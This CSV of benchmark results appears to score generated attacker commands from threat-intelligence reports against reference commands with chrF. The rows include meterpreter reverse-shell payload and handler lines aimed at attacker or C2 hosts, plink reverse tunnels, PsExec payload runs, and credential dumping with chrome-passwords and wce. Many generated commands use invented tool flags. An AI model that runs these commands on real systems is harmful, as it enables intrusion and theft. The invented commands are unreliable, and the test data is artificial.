report,file,tool,input_command,matched_command,chrf_score,match_found
AnotherVictim_FIN6,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
AnotherVictim_FIN6,command_psexec_TA0002_T1059.txt,psexec,"psexec \\target_system -accepteula -nobanner cmd /c ""notepad.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","27,857",True
BITDEFENDER_CARBANAK,command_adfind_TA0007_T1083.txt,adfind,adfind -sc adobjcnt:user,"adfind -f ""(objectcategory=group)""`","30,039",True
BITDEFENDER_CARBANAK,command_pupy_TA0001_T1078.txt,pupy,creddump -o C:\Users\adm_admin\AppData\Roaming\Microsoft\Credentials,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","38,887",True
BITDEFENDER_CARBANAK,command_pupy_TA0002_T1059.txt,pupy,beroot --target <windows|linux>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"24,025",True
BITDEFENDER_CARBANAK,command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe triage /luid:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"26,927",True
BITDEFENDER_CARBANAK,command_wmic_TA0007_T1082.txt,wmic,wmic computersystem get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","24,39",True
COSMIC_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -b <domain_controller> -f ""(|(name=<malicious_file_name>.jpg)(name=<malicious_file_name>.doc))"" -d ""JPEG Photo""",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"11,814",True
COSMIC_APT29,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
COSMIC_APT29,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
COZY2_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /node:<target_computer> /namespace:\\root\cimv2 path Win32_Process call Create,CommandLine=""calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","24,287",True
COZY_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -sddl+++ -resolvesids -sdpipe+x -where ""(&(objectCategory=computer)(dn=<pandora_music_streaming_service_dns>))""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"25,741",True
COZY_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
CrashOverride_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -l -accepteula -nobanner cmd /c ""sc stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","25,864",True
CrashOverride_SANDWORM,command_ryuk_TA0002_T1053.txt,ryuk,ryuk.exe /schtasks,`ryuk.exe --encrypt --process-name notepad.exe`,"30,861",True
CrashOverride_SANDWORM,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /p <persist_file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"24,639",True
CrashOverride_SANDWORM,command_ryuk_TA0004_T1543.txt,ryuk,ryuk.exe /target:C:\Windows\System32\services.exe,`ryuk.exe --encrypt --process-name notepad.exe`,"23,239",True
CROWD_APT29,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
CROWD_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /NAMESPACE:""root\cimv2"" /ROLE:__elah! /NODE:<computer_name> PROCESS CREATE <namespace_path>\Win32_Process.StartService","`wmic /node:#{""POS system""} process call create #{""executable""}`","11,181",True
CROWD_APT29,command_wmic_TA0007_T1518.txt,wmic,wmic SYSDRIVER list /format:list,"`wmic /node:#{""POS system""} process call create #{""executable""}`","12,627",True
CROWD_CARBANAK,command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump,"adfind -f ""(objectcategory=group)""`","31,38",True
CROWD_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
CROWD_CARBANAK,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -OutputPath <obfuscated_file_path> -InputFile <original_file_path>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"23,677",True
CROWD_CARBANAK,command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""Start-Process -FilePath '<file_path>' -ArgumentList '<arguments>'""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`","21,867",True
CROWD_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"56,249",True
CROWD_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -u <user_name> -p <password> -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","29,269",True
CROWD_CARBANAK,command_plink_TA0008_T1021.txt,plink,plink.exe -no-antispoof -R 3389:localhost:3389 <victim_machine_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","43,232",True
CROWD_CARBANAK,command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -u <username> -p <password> -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,544",True
CROWD_CARBANAK,command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -h -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""copy C:\path\to\target_file.exe %appdata%\Microsoft\Windows\Downloaded Program Files""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,667",True
CROWD_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe -e,`ryuk.exe --encrypt --process-name notepad.exe`,"47,11",True
CROWD_CARBANAK,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce.exe /dump /ntlm,"```sh
wce.exe -w
```","30,054",True
CROWD_WIZARDSPIDER,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1035.txt,metasploit,msfpayload windows/xp/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"49,542",True
CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1059.txt,metasploit,use auxiliary/scanner/smb/smb_login,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","43,356",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1018.txt,metasploit,"plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389","```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","21,815",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1057.txt,metasploit,code_factory.make_random_stub --type if_statement,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"16,116",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1082.txt,metasploit,use powershell mixin; payload_info; osinfo,`meterpreter > load powershell`,"28,341",True
CROWD_WIZARDSPIDER,command_metasploit_TA0011_T1071.txt,metasploit,use scanner/winrm/winrm_login,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"15,947",True
CROWD_WIZARDSPIDER,command_plink_TA0011_T1105.txt,plink,"plink.exe -i <private_key_file> -ssh user@192.168.0.4 -m ""<command_to_execute>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","34,237",True
CROWD_WIZARDSPIDER,command_psexec_TA0001_T1078.txt,psexec,"psexec \\example.com -u adminuser -c C:\path\to\malware.exe -a 1,2 -f","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,86",True
CROWD_WIZARDSPIDER,command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -e -u <new_user_name> -p <password> -w C:\directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","19,998",True
CROWD_WIZARDSPIDER,command_psexec_TA0004_T1078.txt,psexec,psexec -e -f -i -n <timeout_seconds> -u <existing_user_name> -w C:\path\to\directory //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","19,168",True
CROWD_WIZARDSPIDER,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Username -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,994",True
CROWD_WIZARDSPIDER,command_psexec_TA0006_T1003.txt,psexec,"psexec -i -u <Domain\User> -p <password> cmd /c ""whoami""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","18,626",True
CROWD_WIZARDSPIDER,command_psexec_TA0008_T1021.txt,psexec,"psexec \\* -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,481",True
CROWD_WIZARDSPIDER,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"49,836",True
CROWD_WIZARDSPIDER,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --process-name <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"49,49",True
CYWARE_FIN6,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
CYWARE_FIN6,command_metasploit_TA0002_T1129.txt,metasploit,"msfconsole -x ""use exploit/windows/local/payload_inject; set PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST=<attacker_IP>; set LPORT=<attacker_port>; exploit""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","40,544",True
CYWARE_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"msfdb -n ""Windows_Service"" -o ""mof"" upload <mof_file>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"19,228",True
CYWARE_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,msfdb --component db_connect -n <name> -u your_current_account_name -p super_secret_password -t super_secret_api_token,"```
    use post/windows/manage/run_as
    set CMD ""netsh advfirewall firewall add rule name='Service Host' dir=in action=allow protocol=TCP localport=5900""
    set DOMAIN <domain_full>
    set PASSWORD <domain_admin_password>
    set USER <domain_admin>
    set SESSION 3
    exploit
    ```","18,207",True
CYWARE_FIN6,command_plink_TA0011_T1105.txt,plink,plink -share <c2_server>,"```sh
plink -ssh #{user}@#{server}
```","38,294",True
CYWARE_FIN6,command_psexec_TA0008_T1021.txt,psexec,psexec -u <remote_username> -p <password> -r <remote_service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,722",True
CYWARE_FIN6,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject-lockergoga,`ryuk.exe --encrypt --process-name notepad.exe`,"33,776",True
CYWARE_OILRIG,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
CYWARE_OILRIG,command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/dns,`meterpreter> getsystem -t 1`,"52,659",True
CYWARE_OILRIG,command_paexec_TA0003_T1505.txt,paexec,paexec -i -c <web_server_script_name>.bat," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","15,972",True
CYWARE_OILRIG,command_plink_TA0001_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"31,53",True
CYWARE_OILRIG,command_pupy_TA0001_T1078.txt,pupy,creddump,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","6,33",True
CYWARE_OILRIG,command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","6,349",True
CYWARE_OILRIG,command_pupy_TA0004_T1078.txt,pupy,lazagne -o db -p <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"10,642",True
CYWARE_OILRIG,command_pupy_TA0005_T1078.txt,pupy,laze -s,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"4,125",True
DEEPWATCH_FIN7,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -s <username>:<domain>:<hash>[:<ntlm_hash>],"```sh
wce.exe -w
```","5,566",True
DIVE_WIZARDSPIDER,command_chrome_passwords_TA0003_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","39,827",True
DIVE_WIZARDSPIDER,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","39,827",True
DIVE_WIZARDSPIDER,command_ryuk_TA0002_T1059.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
DIVE_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
DOJ_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -no-antispoof <attacker_ssh_user>@<command_and_control_server_IP>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","34,827",True
DOJ_FIN7,command_pupy_TA0001_T1078.txt,pupy,lazagne,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"5,598",True
DOJ_FIN7,command_pupy_TA0003_T1078.txt,pupy,loot_memory -b <browser_password>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","12,714",True
DOJ_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne --all,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"7,39",True
DOJ_FIN7,command_pupy_TA0005_T1078.txt,pupy,loot_memory -b <browser_name>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","17,306",True
DOJ_FIN7,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -k MYDOMAIN -t <TGT_ticket> -s <Session_Key>,"```sh
wce.exe -w
```","5,018",True
DUKES_APT29,command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -ExecutionPolicy Bypass -File <script_file_path>,"`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`","24,725",True
DUKES_APT29,command_metasploit_TA0010_T1041.txt,metasploit,recon/gather/credentials collect_creds,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"57,01",True
DUKES_APT29,command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_http; set RHOST <c2_server_ip>; set RPORT 8080; exploit',"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","45,662",True
DUKES_APT29,command_metasploit_TA0011_T1102.txt,metasploit,curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","40,354",True
DUKES_APT29,command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -d","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,182",True
DUKES_APT29,command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -u <username> -p <password> cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","25,646",True
FIREEYE1_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FIREEYE1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE1_CARBANAK,command_paexec_TA0002_T1204.txt,paexec,"PAExec -program ""<malicious_file_path>"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","13,231",True
FIREEYE1_CARBANAK,command_paexec_TA0011_T1021.txt,paexec,paeexec -c -u <victims_username> -p <attacker_password> -w %windir% -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","25,201",True
FIREEYE1_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paexec.exe -s -u <user_name> -p <password> -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","36,42",True
FIREEYE1_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,'ryuk.exe --process-name notepad.exe',`ryuk.exe --encrypt --process-name notepad.exe`,"85,814",True
FIREEYE1_CARBANAK,command_ryuk_TA0006_T1055.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
FIREEYE1_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture-desktop,`ryuk.exe --encrypt --process-name notepad.exe`,"30,813",True
FIREEYE1_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"39,423",True
FIREEYE2_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind -jsd xxx -ntsecuritydescriptor -sddl++ -resolvesids <LNK_file_path>,`adfind.exe -f (objectcategory=person) > ad_users.txt`,"15,178",True
FIREEYE3_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -InputFile <image_file> -OutputFile <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,208",True
FIREEYE3_FIN7,command_metasploit_TA0002_T1059.txt,metasploit,"msfconsole -q; irb; require 'msf/core/exploitation'; require 'msf/util/powershell'; js = ::Rex::Exploitation::JSObfu.new %Q|eval('eval(String.fromCharCode(98,111,100));');|; js.obfuscate","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","15,715",True
FIREEYE4_FIN7,command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE4_FIN7,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE4_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Command:,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"4,758",True
FIREEYE4_FIN7,command_plink_TA0008_T1021.txt,plink,plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","42,943",True
FIREEYE4_FIN7,command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,"20,723",True
FIREEYE4_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,186",True
FIREEYE4_FIN7,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"46,374",True
FIREEYE5_FIN7,command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"17,117",True
FIREEYE5_FIN7,command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"14,234",True
FIREEYE5_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","42,096",True
FIREEYE5_FIN7,command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"39,425",True
FIREEYE5_FIN7,command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"34,39",True
FIREEYE5_FIN7,command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"46,78",True
FIREEYE5_FIN7,command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"58,531",True
FIREEYE5_FIN7,command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"27,894",True
FIREEYE6_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FIREEYE6_FIN7,command_invoke_psimage_TA0003_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.exe -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"47,016",True
FIREEYE6_FIN7,command_invoke_psimage_TA0004_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.png -Image .\kiwi.jpg -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"52,075",True
FIREEYE6_FIN7,command_wmic_TA0007_T1057.txt,wmic,wmic path win32_process get name,"`wmic /node:#{""POS system""} process call create #{""executable""}`","23,52",True
FIREEYE6_FIN7,command_wmic_TA0009_T1018.txt,wmic,"wmic path win32_process get processid, name, executablepath /value","`wmic /node:#{""POS system""} process call create #{""executable""}`","29,713",True
FIREEYE6_FIN7,command_wmic_TA0009_T1082.txt,wmic,wmic process list /output:XML > process_output.xml,"`wmic /node:#{""POS system""} process call create #{""executable""}`","19,744",True
FORCEPOINT_CARBANAK,command_chrome_passwords_TA0011_T1102.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FORCEPOINT_CARBANAK,command_plink_TA0002_T1071.txt,plink,"plink.exe -load mysession -o ""POST /path/to/web/protocol"" -v","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","20,757",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1071.txt,plink,"plink.exe mysession echo ""GET / HTTP/1.1"" -batch",`plink.exe <domain_admin>@<bankfileserver_ip>`,"20,78",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1105.txt,plink,plink -batch -ssh ggldr@<google_service_url>,"```sh
plink -ssh #{user}@#{server}
```","20,408",True
FORK_APT29,command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","33,482",True
FORK_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,258",True
FORK_APT29,command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,"29,384",True
FORK_APT29,command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","32,856",True
FORK_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"27,913",True
FORK_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,434",True
FORK_APT29,command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe kill,`rubeus.exe kerberoast /domain:oz.local`,"54,411",True
FORK_APT29,command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe triage,`rubeus.exe kerberoast /domain:oz.local`,"45,516",True
FORTINET_OILRIG,command_ryuk_TA0002_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
FORTINET_OILRIG,command_wmic_TA0002_T1047.txt,wmic,wmic /node:<c2_server_ip> /namespace:\\root\cimv2 path Win32_PingResult call Ping,"`wmic /node:#{""POS system""} process call create #{""executable""}`","19,692",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
